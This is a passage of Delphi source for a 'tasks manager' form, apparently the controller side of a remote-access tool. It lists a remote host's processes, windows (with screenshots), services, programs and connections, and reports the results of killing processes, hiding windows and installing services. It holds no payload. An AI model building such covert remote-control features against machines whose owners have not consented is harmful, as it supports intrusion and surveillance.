unit UnitTasksManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, Menus, ImgList, UnitConnection, IniFiles, IdTCPServer,
  jpeg, UnitMain;

type
  TFormTasksManager = class(TForm)
    stat1: TStatusBar;
    pgc1: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    ts3: TTabSheet;
    ts4: TTabSheet;
    ts5: TTabSheet;
    lvProcess: TListView;
    lvWindows: TListView;
    lvServices: TListView;
    lvPrograms: TListView;
    lvConnections: TListView;
    ilThumbs: TImageList;
    ilIcons: TImageList;
    pm4: TPopupMenu;
    R6: TMenuItem;
    N6: TMenuItem;
    U1: TMenuItem;
    S5: TMenuItem;
    pm3: TPopupMenu;
    R5: TMenuItem;
    N5: TMenuItem;
    S3: TMenuItem;
    S4: TMenuItem;
    pm2: TPopupMenu;
    R4: TMenuItem;
    O1: TMenuItem;
    N3: TMenuItem;
    S2: TMenuItem;
    H1: TMenuItem;
    C1: TMenuItem;
    N4: TMenuItem;
    C2: TMenuItem;
    pm1: TPopupMenu;
    R2: TMenuItem;
    N1: TMenuItem;
    S1: TMenuItem;
    R3: TMenuItem;
    N2: TMenuItem;
    K1: TMenuItem;
    pm5: TPopupMenu;
    R14: TMenuItem;
    R15: TMenuItem;
    N9: TMenuItem;
    K2: TMenuItem;
    W1: TMenuItem;
    E1: TMenuItem;
    I1: TMenuItem;
    U2: TMenuItem;
    S7: TMenuItem;
    D1: TMenuItem;
    C4: TMenuItem;
    C5: TMenuItem;
    C6: TMenuItem;
    S6: TMenuItem;
    procedure lvProcessCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure lvWindowsCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure lvServicesCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure lvProgramsCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure lvConnectionsCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure R2Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure lvProcessContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R3Click(Sender: TObject);
    procedure K1Click(Sender: TObject);
    procedure C5Click(Sender: TObject);
    procedure lvWindowsContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R4Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure H1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure W1Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure C6Click(Sender: TObject);
    procedure lvServicesContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R5Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure S4Click(Sender: TObject);
    procedure E1Click(Sender: TObject);
    procedure I1Click(Sender: TObject);
    procedure U2Click(Sender: TObject);
    procedure lvProgramsContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R6Click(Sender: TObject);
    procedure U1Click(Sender: TObject);
    procedure S5Click(Sender: TObject);
    procedure lvConnectionsContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R14Click(Sender: TObject);
    procedure R15Click(Sender: TObject);
    procedure C4Click(Sender: TObject);
    procedure K2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure lvProcessKeyPress(Sender: TObject; var Key: Char);
    procedure S6Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;    
    procedure UpdateStatus(Status: string);
    procedure AddThumb(Bmp: TBitmap; Handle: string);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormTasksManager: TFormTasksManager;

implementation

uses
  UnitConstants, UnitFunctions, UnitServicesManager, UnitStringCompression;

{$R *.dfm}
        
constructor TFormTasksManager.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormTasksManager.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormTasksManager.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
  TmpStr, TmpStr1: string;
  TmpArray: array[0..4] of string;
  i: Integer;
  TmpItem: TListItem;
  Stream: TMemoryStream;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = PROCESS then
  begin
    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = PROCESSLIST then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvProcess.Clear;
      lvProcess.Items.BeginUpdate;

      while ReceivedDatas <> '' do
      begin
        TmpItem := lvProcess.Items.Add;

        TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        if TmpStr = Client.ConnInfos.PID then TmpItem.Data := TObject(clRed);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpItem.Caption := TmpStr;
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(FileSizeToStr(StrToInt(FloatToStr(StrToFloat(Copy(ReceivedDatas,
          1, Pos('|', ReceivedDatas)-1))))));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        Delete(ReceivedDatas, 1, 2);

        if FileExists(TmpItem.SubItems.Strings[4]) = True then
          TmpItem.ImageIndex := GetImageIndex(TmpItem.SubItems.Strings[4])
        else TmpItem.ImageIndex := GetImageIndex('*' + ExtractFileExt(TmpItem.SubItems.Strings[0]));
      end;

      lvProcess.Items.EndUpdate;
      UpdateStatus('Remote process listed: ' + IntToStr(lvProcess.Items.Count));
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = PROCESSKILL then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvProcess.Items.BeginUpdate;
      for i:=0 to lvProcess.Items.Count-1 do
      begin
        if (lvProcess.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvProcess.Items.Item[i].Delete;
          Break;
        end;
      end;
      lvProcess.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to kill remote process "' + TmpStr + '".') else
        UpdateStatus('Remote process "' + TmpStr + '" killed!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = PROCESSSUSPEND then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvProcess.Items.BeginUpdate;
      for i:=0 to lvProcess.Items.Count-1 do
      begin
        if (lvProcess.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvProcess.Items.Item[i].Data := TObject(clGray);
          lvProcess.Items.Item[i].Cut := True;
        end;
      end;
      lvProcess.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to suspend remote process "' + TmpStr + '".') else
        UpdateStatus('Remote process "' + TmpStr + '" suspended!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = PROCESSRESUME then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvProcess.Items.BeginUpdate;
      for i:=0 to lvProcess.Items.Count-1 do
      begin
        if (lvProcess.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvProcess.Items.Item[i].Data := TObject(clBlack);
          lvProcess.Items.Item[i].Cut := False;
        end;
      end;
      lvProcess.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to resume remote process "' + TmpStr + '".') else
        UpdateStatus('Remote process "' + TmpStr + '" resumed!');
    end;
  end
  else

  if MainCommand = UnitConstants.WINDOWS then
  begin
    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = WINDOWSLIST then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      if lvWindows.ViewStyle = vsIcon then lvWindows.ViewStyle := vsReport;

      lvWindows.Clear;
      lvWindows.Items.BeginUpdate;

      while ReceivedDatas <> '' do
      begin
        TmpItem := lvWindows.Items.Add;
        TmpItem.Caption := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        if TmpStr = 'No' then
        begin
          TmpItem.Data := TObject(clGray);
          TmpItem.Cut := True;
        end;
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpItem.SubItems.Add(TmpStr);
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        
        TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        if TmpStr = Client.ConnInfos.PID then TmpItem.Data := TObject(clRed);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpItem.SubItems.Add(TmpStr);
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        Delete(ReceivedDatas, 1, 2);

        if FileExists(TmpItem.SubItems.Strings[4]) = True then
          TmpItem.ImageIndex := GetImageIndex(TmpItem.SubItems.Strings[4])
        else TmpItem.ImageIndex := GetImageIndex('*' + ExtractFileExt(TmpItem.SubItems.Strings[4]));
      end;

      lvWindows.Items.EndUpdate;
      UpdateStatus('Remote windows listed: ' + IntToStr(lvWindows.Items.Count));
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = WINDOWSTHUMBNAILS then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvWindows.ViewStyle := vsIcon;
      ilThumbs.Clear;
      ilThumbs.Width := 300;
      ilThumbs.Height := 200;

      for i := 0 to lvWindows.Items.Count -1 do lvWindows.Items.Item[i].ImageIndex := -1;

      while ReceivedDatas <> '' do
      begin
        TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        Stream := TMemoryStream.Create;
        StrToStream(TmpStr1, Stream);
        Stream.Position := 0;

        try
          Jpg := TJPEGImage.Create;
          Jpg.LoadFromStream(Stream);
          Stream.Free;
          Bmp := TBitmap.Create;
          Bmp.Width := Jpg.Width;
          Bmp.Height := Jpg.Height;
          Bmp.Canvas.Draw(0, 0, Jpg);
          Jpg.Free;
        except
        end;

        AddThumb(Bmp, TmpStr);
        Bmp.Free;
      end;

      lvWindows.Items.BeginUpdate;
      for i := 0 to lvWindows.Items.Count -1 do
      if lvWindows.Items.Item[i].Cut = True then lvWindows.Items.Item[i].Delete;
      lvWindows.Items.EndUpdate;

      UpdateStatus('Remote windows thumbnails showed!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = WINDOWSSHOW then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvWindows.Items.BeginUpdate;
      for i:=0 to lvWindows.Items.Count-1 do
      begin
        if (lvWindows.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvWindows.Items.Item[i].Data := TObject(clBlack);
          lvWindows.Items.Item[i].Cut := False;
        end;
      end;
      lvWindows.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to show remote window "' + TmpStr + '".') else
        UpdateStatus('Remote window "' + TmpStr + '" showed!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = WINDOWSSHOW then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvWindows.Items.BeginUpdate;
      for i:=0 to lvWindows.Items.Count-1 do
      begin
        if (lvWindows.Items.Item[i].SubItems[2] = TmpStr) and (ReceivedDatas = 'Y') then
        begin                          
          lvWindows.Items.Item[i].SubItems[1] := 'Yes';
          lvWindows.Items.Item[i].Data := TObject(clBlack);
          lvWindows.Items.Item[i].Cut := False;
        end;
      end;
      lvWindows.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to show remote window "' + TmpStr + '".') else
        UpdateStatus('Remote window "' + TmpStr + '" showed!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = WINDOWSHIDE then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvWindows.Items.BeginUpdate;
      for i:=0 to lvWindows.Items.Count-1 do
      begin
        if (lvWindows.Items.Item[i].SubItems[2] = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvWindows.Items.Item[i].SubItems[1] := 'No';
          lvWindows.Items.Item[i].Data := TObject(clGray);
          lvWindows.Items.Item[i].Cut := True;
        end;
      end;
      lvWindows.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to hide remote window "' + TmpStr + '".') else
        UpdateStatus('Remote window "' + TmpStr + '" hidden!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = WINDOWSCLOSE then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvWindows.Items.BeginUpdate;
      for i:=0 to lvWindows.Items.Count-1 do
      begin
        if (lvWindows.Items.Item[i].SubItems[2] = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvWindows.Items.Item[i].Delete;
          Break;
        end;
      end;
      lvWindows.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to close remote window "' + TmpStr + '".') else
        UpdateStatus('Remote window "' + TmpStr + '" closed!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = WINDOWSTITLE then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvWindows.Items.BeginUpdate;
      for i:=0 to lvWindows.Items.Count-1 do
      begin
        if (lvWindows.Items.Item[i].SubItems[2] = TmpStr) and (TmpStr1 = 'Y') then
        lvWindows.Items.Item[i].Caption := ReceivedDatas;
      end;
      lvWindows.Items.EndUpdate;

      if TmpStr1 = 'N' then UpdateStatus('Failed to change remote window "' + TmpStr + '" title.') else
        UpdateStatus('Remote window "' + TmpStr + '" title changed!');
    end;
  end
  else

  if MainCommand = SERVICES then
  begin
    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = SERVICESLIST then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvServices.Clear;
      lvServices.Items.BeginUpdate;

      while ReceivedDatas <> '' do
      begin
        TmpItem := lvServices.Items.Add;
        TmpItem.Caption := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        if TmpStr = 'Stopped' then
        begin
          TmpItem.Data := TObject(clGray);
          TmpItem.Cut := True;
        end;
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpItem.SubItems.Add(TmpStr);
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        Delete(ReceivedDatas, 1, 2);

        TmpItem.ImageIndex := 0;
      end;

      lvServices.Items.EndUpdate;
      UpdateStatus('Remote running services listed: ' + IntToStr(lvServices.Items.Count));
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = SERVICESSTOP then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvServices.Items.BeginUpdate;
      for i:=0 to lvServices.Items.Count-1 do
      begin
        if (lvServices.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvServices.Items.Item[i].Data := TObject(clGray);
          lvServices.Items.Item[i].Cut := True;
          lvServices.Items.Item[i].SubItems[0] := 'Stopped';
        end;
      end;
      lvServices.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to stop remote service "' + TmpStr + '".') else
        UpdateStatus('Remote service "' + TmpStr + '" stopped!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = SERVICESSTART then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvServices.Items.BeginUpdate;
      for i:=0 to lvServices.Items.Count-1 do
      begin
        if (lvServices.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvServices.Items.Item[i].Data := TObject(clBlack);
          lvServices.Items.Item[i].Cut := False;
          lvServices.Items.Item[i].SubItems[0] := 'Running';
        end;
      end;
      lvServices.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to start remote service "' + TmpStr + '".') else
        UpdateStatus('Remote service "' + TmpStr + '" started!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = SERVICESINSTALL then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      if ReceivedDatas = 'N' then UpdateStatus('Failed to install remote service "' + TmpStr + '".') else
        UpdateStatus('Remote service "' + TmpStr + '" installed!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = SERVICESUNINSTALL then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvServices.Items.BeginUpdate;
      for i:=0 to lvServices.Items.Count-1 do
      begin
        if (lvServices.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvServices.Items.Item[i].Delete;
          Break;
        end;
      end;
      lvServices.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to uninstall remote service "' + TmpStr + '".') else
        UpdateStatus('Remote service "' + TmpStr + '" uninstalled!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = SERVICESEDIT then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpArray[0] := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpArray[1] := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas)); 
      TmpArray[2] := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpArray[3] := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpArray[4] := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvServices.Items.BeginUpdate;
      for i:=0 to lvServices.Items.Count-1 do
      begin
        if (lvServices.Items.Item[i].Caption = TmpArray[0]) and (TmpArray[1] = 'Y') then
        begin
          lvServices.Items.Item[i].Caption := TmpArray[2];
          lvServices.Items.Item[i].SubItems[1] := TmpArray[3];   
          lvServices.Items.Item[i].SubItems[2] := TmpArray[4];
        end;
      end;
      lvServices.Items.EndUpdate;

      if TmpArray[1] = 'N' then UpdateStatus('Failed to edit remote service "' + TmpArray[0] + '".') else
        UpdateStatus('Remote service "' + TmpArray[0] + '" edited!');
    end;
  end
  else

  if MainCommand = PROGRAMS then
  begin
    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = PROGRAMSLIST then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvPrograms.Clear;
      lvPrograms.Items.BeginUpdate;

      while ReceivedDatas <> '' do
      begin
        TmpItem := lvPrograms.Items.Add;
        TmpItem.Caption := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        Delete(ReceivedDatas, 1, 2);

        TmpItem.ImageIndex := 1;
      end;

      lvPrograms.Items.EndUpdate;
      UpdateStatus('Remote installed programs listed: ' + IntToStr(lvPrograms.Items.Count));
    end;
  end
  else

  if MainCommand = ACTIVECONNECTIONS then
  begin
    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = ACTIVECONNECTIONSLIST then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvConnections.Clear;
      lvConnections.Items.BeginUpdate;

      while ReceivedDatas <> '' do
      begin
        TmpItem := lvConnections.Items.Add;

        TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
        if TmpStr = Client.ConnInfos.PID then TmpItem.Data := TObject(clRed);
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

        TmpItem.Caption := TmpStr;
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
        Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
        Delete(ReceivedDatas, 1, 2);

        TmpItem.ImageIndex := 2;
      end;

      lvConnections.Items.EndUpdate;
      UpdateStatus('Remote active connections listed: ' + IntToStr(lvConnections.Items.Count));
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = ACTIVECONNECTIONSCLOSE then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvConnections.Items.BeginUpdate;
      for i:=0 to lvConnections.Items.Count-1 do
      begin
        if (lvConnections.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
          lvServices.Items.Item[i].SubItems[4] := 'CLOSING';
      end;
      lvConnections.Items.EndUpdate;

      if ReceivedDatas = 'N' then
        UpdateStatus('Failed to close remote active connection process"' + TmpStr + '".')
      else UpdateStatus('Remote active connection process "' + TmpStr + '" closed!');
    end
    else

    if Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1) = ACTIVECONNECTIONSKILLPROCESS then
    begin
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

      lvConnections.Items.BeginUpdate;
      for i:=0 to lvConnections.Items.Count-1 do
      begin
        if (lvConnections.Items.Item[i].Caption = TmpStr) and (ReceivedDatas = 'Y') then
        begin
          lvConnections.Items.Item[i].Delete;
          Break;
        end;
      end;
      lvConnections.Items.EndUpdate;

      if ReceivedDatas = 'N' then UpdateStatus('Failed to kill remote process "' + TmpStr + '".') else
        UpdateStatus('Remote process "' + TmpStr + '" killed!');
    end;
  end;
end;

procedure TFormTasksManager.UpdateStatus(Status: string);
begin
  stat1.Panels.Items[0].Text := Status;
end;
              
procedure TFormTasksManager.AddThumb(Bmp: TBitmap; Handle: string);
var
  i: Integer;
begin
  for i := 0 to lvWindows.Items.Count -1 do
  begin
    if lvWindows.Items[i].SubItems[2] = Handle then
    lvWindows.Items[i].ImageIndex := ilThumbs.Add(Bmp, nil);
  end;
end;

procedure TFormTasksManager.lvProcessCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormTasksManager.lvWindowsCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormTasksManager.lvServicesCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormTasksManager.lvProgramsCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormTasksManager.lvConnectionsCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
